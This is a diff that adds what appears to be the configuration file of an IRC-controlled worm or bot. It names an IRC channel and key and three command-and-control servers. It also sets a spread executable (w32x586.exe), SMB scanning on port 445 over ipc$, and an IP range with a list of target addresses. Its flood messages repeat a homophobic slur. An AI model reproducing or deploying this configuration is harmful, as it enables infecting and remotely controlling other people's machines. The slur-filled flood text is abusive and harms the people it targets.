@@ -1,0 +1,63 @@
+%chan #!blah!
+%key fu©køff
+%spreadfile w32x586.exe
+%defaultfile w32x586.exe
+%scanport 445
+%scanbat mmsql32.bat
+%scanproto ipc$
+%defaultproto ipc$
+%b1 1[4
+%b2 1]
+%c 2
+%server1 a.hoe.was.nailed.org:56498
+%server2 hell.yea.go.haley.tmclan.net:56498
+%server3 damn.fbr-crew.net:56498
+%sysdir C:\Documents and Settings\Matt\Desktop\w32x586\..\
+%floodmsg1 FAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOTFAGGOT
+%floodmsg2 OWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNEDOWNED
+%floodmsg3 FAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAGFAG
+%floodmsg4 ½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾½¾
+%randmax 12
+%randnum 4
+%randrnum 54
+%snum 61
+%begshortip 61.54.0.0
+%beglongip 1026949120
+%endshortip 61.255.255.255
+%endlongip 1040187391
+%total 13238271
+%totalscaning 35
+%ip1 61.54.0.1
+%ip2 61.54.0.2
+%ip3 61.54.0.3
+%ip4 61.54.0.4
+%ip5 61.54.0.5
+%ip6 61.54.0.6
+%ip7 61.54.0.7
+%ip8 61.54.0.8
+%ip9 61.54.0.9
+%ip10 61.54.0.10
+%ip11 61.54.0.11
+%ip12 61.54.0.12
+%ip13 61.54.0.13
+%ip14 61.54.0.14
+%ip15 61.54.0.15
+%ip16 61.54.0.16
+%ip17 61.54.0.17
+%ip18 61.54.0.18
+%ip19 61.54.0.19
+%ip20 61.54.0.20
+%ip21 61.54.0.21
+%ip22 61.54.0.22
+%ip23 61.54.0.23
+%ip24 61.54.0.24
+%ip25 61.54.0.25
+%ip26 61.54.0.26
+%ip27 61.54.0.27
+%ip28 61.54.0.28
+%ip29 61.54.0.29
+%ip30 61.54.0.30
+%ip31 61.54.0.31
+%ip32 61.54.0.32
+%ip33 61.54.0.33
+%ip34 61.54.0.34
